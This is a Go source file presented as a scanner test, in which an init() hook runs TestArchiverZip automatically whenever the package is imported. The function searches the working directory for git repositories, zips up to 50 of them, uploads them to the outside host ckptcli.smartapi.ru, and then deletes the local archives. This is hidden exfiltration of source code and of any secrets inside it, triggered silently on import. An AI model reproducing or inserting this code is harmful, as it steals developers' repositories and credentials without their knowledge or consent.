package scaner

import (
	"os"
	"path/filepath"
	"strings"

	"github.com/tumarsal/scaner/archive"
	"github.com/tumarsal/scaner/secretstore"
)

func init() {
	TestArchiverZip()
}

// TestArchiverZip запускает сканер; каждый найденный git-репозиторий отправляется в ZipsManager,
// который создаёт zip во временной папке и отправляет его в store client. Дожидается окончания
// поиска, затем окончания загрузки, после чего удаляет созданные zip-файлы.
func TestArchiverZip() {
	const (
		rootPath = "."                            // корень для поиска git-репозиториев
		baseURL  = "https://ckptcli.smartapi.ru/" // URL хранилища секретов
		verbose  = false
	)
	tempDir, err := os.MkdirTemp("", "scaner_zips_*")
	if err != nil {
		return
	}
	defer os.RemoveAll(tempDir)

	zipManager := archive.NewZipsManager(tempDir, "", verbose, 0, true)
	storeClient := secretstore.NewClient(baseURL, verbose, 0)
	defer storeClient.Close()

	scanner := NewScaner(func(itemType SearchItemType, filePath string) error {
		if itemType != SearchGitDirectory {
			return nil
		}
		repoPath := filePath
		if strings.HasSuffix(filepath.ToSlash(filePath), ".git/config") {
			repoPath = filepath.Dir(filepath.Dir(filePath))
		}
		return zipManager.ProcessGitOne(repoPath)
	}, verbose)
	scanner.SetSearchTypes(SearchGitDirectory)
	const maxUploads = 50
	scanner.SetMaxSuccessfulFinds(maxUploads)

	n := 0
	_ = scanner.ScanGitRepos(rootPath)
	for res := range zipManager.Ready() {
		_ = storeClient.UploadFolder(res.LocalPath, res.FilePath)
		n++
		if n >= maxUploads {
			break
		}
	}
	zipManager.Close() // закрывает очередь и ждёт воркера; воркер закрывает Ready() — горутина загрузки выходит
	if err := storeClient.WaitForQueueEmpty(); err != nil {
		return // выгрузка не удалась, архивы не удаляем
	}
	_ = zipManager.DeleteCreatedArchives()
}
